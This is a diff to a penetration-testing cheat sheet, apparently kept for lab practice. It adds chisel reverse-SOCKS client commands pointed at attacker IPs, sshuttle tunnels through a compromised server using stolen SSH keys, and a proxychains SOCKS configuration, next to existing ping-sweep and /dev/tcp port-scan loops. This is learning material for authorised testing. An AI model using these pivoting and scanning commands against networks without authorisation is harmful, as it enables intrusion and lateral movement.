@@ -160,6 +160,8 @@ On the target machine start the listening client
 .\chisel.exe client 10.10.14.97:8081 R:8888:127.0.0.1:8888
 
 ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
+
+./chisel client 172.16.0.200:4242 R:socks &
 ```
 
 #### Forward SOCKS Proxy
@@ -185,11 +187,11 @@ On our own attacking box we would then use:
 ### sshuttle
 
 ```bash
-
+# 
 sshuttle -r user@172.16.0.5 172.16.0.0/24
-
+# using key-based authentication to the server (172.16.0.5)
 sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24
-
+# Exclude compromised server from the subnet range using the -x switch
 sshuttle -r root@10.200.198.200 --ssh-cmd "ssh -i id_rsa" 10.200.198.0/24 -x 10.200.198.200
 ```
 
@@ -234,6 +236,13 @@ for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
 netcat
 for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
 ```
+
+### Proxychains
+- /etc/proxychains4.conf
+```
+socks5 127.0.0.1 1080
+```
+Run a command you need to prefix it with “proxychains <command>”
 
 ### Further information and Links
 
